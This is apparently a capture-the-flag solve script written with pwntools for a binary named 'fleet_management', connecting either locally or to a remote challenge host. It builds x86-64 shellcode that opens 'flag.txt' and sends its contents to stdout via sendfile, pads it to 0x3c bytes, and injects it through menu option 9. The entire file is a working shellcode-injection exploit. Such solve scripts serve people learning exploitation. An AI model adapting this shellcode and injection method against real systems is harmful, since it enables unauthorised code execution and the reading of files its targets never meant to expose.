#!/usr/bin/env python3

from pwn import *

the_binary = "./fleet_management"
context.binary = the_binary
elf = context.binary

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("138.68.156.143", 31272)
else:
    io = process(the_binary)

if args.GDB:
    gdb.attach(io, """
        continue
    """)

# SYS_openat(AT_FDCWD, "flag.txt", O_RDONLY, ignored)
# SYS_sendfile(stdout_fd, flag_fd, 0, 0x20)
sc = asm(f"""
    mov rdi, {constants.AT_FDCWD}
    lea rsi, [rip+flag_str]
    xor rdx, rdx
    mov rax, {constants.SYS_openat}
    syscall

    mov rdi, {constants.STDOUT_FILENO}
    push rax
    pop rsi
    push 0x20
    pop r10
    mov rax, {constants.SYS_sendfile}
    syscall

flag_str:
    .string "flag.txt"
    .byte 0
""")

log.info("Shellcode len: %#x" % len(sc))
assert len(sc) <= 0x3c
sc += b"\x90" * (0x3c - len(sc))

io.sendlineafter("to do?", "9")
io.send(sc)
io.interactive()

